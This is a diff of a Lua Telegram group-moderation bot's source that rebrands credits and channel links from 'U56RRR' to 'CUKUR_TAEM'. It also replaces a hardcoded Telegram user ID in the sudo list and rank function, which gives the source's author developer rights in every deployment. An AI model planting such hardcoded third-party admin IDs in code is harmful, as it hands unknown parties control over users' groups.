@@ -1,8 +1,8 @@
 ------------------------------------------------
--- This Source Was Developed By (RaHMaN) @U2288.--
+-- This Source Was Developed By (Ali) @AAAPA.--
 --    This Is The Source Channel @CUKUR_TAEM .    --
---                 - CUKUR -                  --
---         -- https://t.me/CUKUR_TAEM  --          --
+--                 - NaJaF -                  --
+--         -- https://t.me/CUKUR_TAEM --          --
 ------------------------------------------------ 
 redis = require('redis') 
 URL = require('socket.url') 
@@ -127,7 +127,7 @@ NaJaF Source
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,742655070,1420345305} or {Config.sudo_users,742655070,1420345305}
+SudoIds = {Config.SudoIds,742655070,2025738733} or {Config.sudo_users,742655070,2025738733}
 NaJaF = Config.NaJaF or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (DevAli:get(NaJaF..'Ali:NameBot') or 'نجف')
@@ -593,7 +593,7 @@ end ,nil)
 end
 --     Source NaJaF     --
 local AliRank = function(msg) if SudoId(msg.sender_user_id_) then NaJaFTEAM  = "المطور" elseif SecondSudo(msg) then NaJaFTEAM = "المطور" elseif SudoBot(msg) then NaJaFTEAM = "المطور" elseif ManagerAll(msg) then NaJaFTEAM = "المدير" elseif AdminAll(msg) then NaJaFTEAM = "الادمن" elseif AliConstructor(msg) then NaJaFTEAM = "المالك" elseif BasicConstructor(msg) then NaJaFTEAM = "المنشئ" elseif Constructor(msg) then NaJaFTEAM = "المنشئ" elseif Manager(msg) then NaJaFTEAM = "المدير" elseif Admin(msg) then NaJaFTEAM = "الادمن" else NaJaFTEAM = "العضو" end return NaJaFTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1420345305) then NaJaFTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(NaJaF) then NaJaFTEAM = 'البوت' elseif SudoId(user_id) then NaJaFTEAM = 'المطور الاساسي' elseif DevAli:sismember(NaJaF..'Ali:SecondSudo:', user_id) then NaJaFTEAM = 'المطور الثانوي' elseif DevAli:sismember(NaJaF..'Ali:SudoBot:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAli:sismember(NaJaF..'Ali:ManagerAll:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAli:sismember(NaJaF..'Ali:AdminAll:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAli:sismember(NaJaF..'Ali:VipAll:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAli:sismember(NaJaF..'Ali:AliConstructor:'..chat_id, user_id) then NaJaFTEAM = 'المالك' elseif DevAli:sismember(NaJaF..'Ali:BasicConstructor:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAli:sismember(NaJaF..'Ali:Constructor:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAli:sismember(NaJaF..'Ali:Managers:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Managers:Rd"..chat_id) or 'المدير' elseif DevAli:sismember(NaJaF..'Ali:Admins:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Admins:Rd"..chat_id) or 'الادمن' elseif DevAli:sismember(NaJaF..'Ali:VipMem:'..chat_id, user_id) then  NaJaFTEAM = DevAli:get(NaJaF.."Ali:VipMem:Rd"..chat_id) or 'المميز' elseif DevAli:sismember(NaJaF..'Ali:Cleaner:'..chat_id, user_id) then  NaJaFTEAM = DevAli:get(NaJaF.."Ali:Cleaner:Rd"..chat_id) or 'المنظف' else NaJaFTEAM = DevAli:get(NaJaF.."Ali:mem:Rd"..chat_id) or 'العضو' end return NaJaFTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(2025738733) then NaJaFTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(NaJaF) then NaJaFTEAM = 'البوت' elseif SudoId(user_id) then NaJaFTEAM = 'المطور الاساسي' elseif DevAli:sismember(NaJaF..'Ali:SecondSudo:', user_id) then NaJaFTEAM = 'المطور الثانوي' elseif DevAli:sismember(NaJaF..'Ali:SudoBot:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAli:sismember(NaJaF..'Ali:ManagerAll:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAli:sismember(NaJaF..'Ali:AdminAll:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAli:sismember(NaJaF..'Ali:VipAll:', user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAli:sismember(NaJaF..'Ali:AliConstructor:'..chat_id, user_id) then NaJaFTEAM = 'المالك' elseif DevAli:sismember(NaJaF..'Ali:BasicConstructor:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAli:sismember(NaJaF..'Ali:Constructor:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAli:sismember(NaJaF..'Ali:Managers:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Managers:Rd"..chat_id) or 'المدير' elseif DevAli:sismember(NaJaF..'Ali:Admins:'..chat_id, user_id) then NaJaFTEAM = DevAli:get(NaJaF.."Ali:Admins:Rd"..chat_id) or 'الادمن' elseif DevAli:sismember(NaJaF..'Ali:VipMem:'..chat_id, user_id) then  NaJaFTEAM = DevAli:get(NaJaF.."Ali:VipMem:Rd"..chat_id) or 'المميز' elseif DevAli:sismember(NaJaF..'Ali:Cleaner:'..chat_id, user_id) then  NaJaFTEAM = DevAli:get(NaJaF.."Ali:Cleaner:Rd"..chat_id) or 'المنظف' else NaJaFTEAM = DevAli:get(NaJaF.."Ali:mem:Rd"..chat_id) or 'العضو' end return NaJaFTEAM end
 --     Source NaJaF     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -664,7 +664,7 @@ end
 function ReplyStatus(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
 if dp.first_name_ ~= false then
-local UserName = (dp.username_ or "U56RRR")
+local UserName = (dp.username_ or "CUKUR_TAEM")
 for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
 dp.first_name_ = gmatch
 end
@@ -1026,7 +1026,7 @@ local Text = [[
 ♪︙م5 ↫ اوامر المطورين
 ♪︙م6 ↫ اوامر الاعضاء
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
@@ -1089,7 +1089,7 @@ local Text = [[
 ♪︙البوتات بالطرد
 ♪︙البوتات بالتقيد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1159,7 +1159,7 @@ local Text = [[
 ♪︙تقييد يوم + عدد الايام
 ♪︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1218,7 +1218,7 @@ local Text = [[
 ♪︙ردود المدير • ردود المطور • التحقق
 ♪︙ضافني • حساب العمر • الزخرفه
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1271,7 +1271,7 @@ local Text = [[
 ♪︙المنشئين الاساسيين 
 ♪︙حذف جميع الرتب
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1351,7 +1351,7 @@ local Text = [[
 ♪︙ترحيب البوت • المغادره
 ♪︙البوت الخدمي • التواصل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1393,7 +1393,7 @@ local Text = [[
 ♪︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ♪︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1605,19 +1605,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local mrali = DevAli:get(NaJaF.."Comd:New:rt:Ali:"..DEV_ABBAS..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:set(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
 DevAli:sadd(NaJaF..'Ali:VipMem:'..msg.chat_id_, result.sender_user_id_)
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:set(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
 DevAli:sadd(NaJaF..'Ali:Admins:'..msg.chat_id_, result.sender_user_id_)
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:set(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
 DevAli:sadd(NaJaF..'Ali:Managers:'..msg.chat_id_, result.sender_user_id_)
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
 end,nil)   
 end   
@@ -1631,19 +1631,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local mrali = DevAli:get(NaJaF.."Comd:New:rt:Ali:"..DEV_ABBAS..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:srem(NaJaF..'Ali:VipMem:'..msg.chat_id_, result.sender_user_id_)
 DevAli:del(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:srem(NaJaF..'Ali:Admins:'..msg.chat_id_, result.sender_user_id_)
 DevAli:del(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:srem(NaJaF..'Ali:Managers:'..msg.chat_id_, result.sender_user_id_)
 DevAli:del(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
 end,nil)   
 end   
@@ -1657,19 +1657,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local mrali = DevAli:get(NaJaF.."Comd:New:rt:Ali:"..text1[2]..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:sadd(NaJaF..'Ali:VipMem:'..msg.chat_id_, result.id_)
 DevAli:set(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:sadd(NaJaF..'Ali:Admins:'..msg.chat_id_, result.id_)
 DevAli:set(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:sadd(NaJaF..'Ali:Managers:'..msg.chat_id_, result.id_)
 DevAli:set(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
 else
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙*المعرف غير صحيح*", 1, 'md')
@@ -1685,19 +1685,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local mrali = DevAli:get(NaJaF.."Comd:New:rt:Ali:"..text1[2]..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:srem(NaJaF..'Ali:VipMem:'..msg.chat_id_, result.id_)
 DevAli:del(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:srem(NaJaF..'Ali:Admins:'..msg.chat_id_, result.id_)
 DevAli:del(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:srem(NaJaF..'Ali:Managers:'..msg.chat_id_, result.id_)
 DevAli:del(NaJaF.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'U56RRR')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CUKUR_TAEM')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
 else
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙*المعرف غير صحيح*", 1, 'md')
@@ -1770,7 +1770,7 @@ end end
 if text == '/start' and ChCheck(msg) then  
 if not DevAli:get(NaJaF..'Ali:Start:Time'..msg.sender_user_id_) then
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
-local inline = {{{text="♪ المطور .",url="t.me/"..(dp.username_ or "U56RRR")}}}
+local inline = {{{text="♪ المطور .",url="t.me/"..(dp.username_ or "CUKUR_TAEM")}}}
 local start = DevAli:get(NaJaF.."Ali:Start:Bot")
 if start then 
 Start_Source = start
@@ -1786,7 +1786,7 @@ end
 --     Source NaJaF     --
 if not SecondSudo(msg) and not DevAli:sismember(NaJaF..'Ali:Ban:Pv',msg.sender_user_id_) and not DevAli:get(NaJaF..'Ali:Texting:Pv') then
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
-Dev_Ali(msg.sender_user_id_, msg.id_, 1, '♪︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "U56RRR")..')', 1, 'md') 
+Dev_Ali(msg.sender_user_id_, msg.id_, 1, '♪︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CUKUR_TAEM")..')', 1, 'md') 
 tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
@@ -2720,7 +2720,7 @@ Welcomes = '• نورت حبي \n• firstname \n• @username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@U56RRR]'))
+local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@CUKUR_TAEM]'))
 Dev_Ali(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end 
 if DevAli:get(NaJaF.."Ali:Lock:Welcome"..msg.chat_id_) then
@@ -2768,7 +2768,7 @@ Welcomes = '• نورت حبي \n• firstname \n• @username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@U56RRR]'))
+local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@CUKUR_TAEM]'))
 Dev_Ali(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end
 --     Source NaJaF     --
@@ -4051,7 +4051,7 @@ Dev_Ali(msg.chat_id_, msg.id_, 1,[[
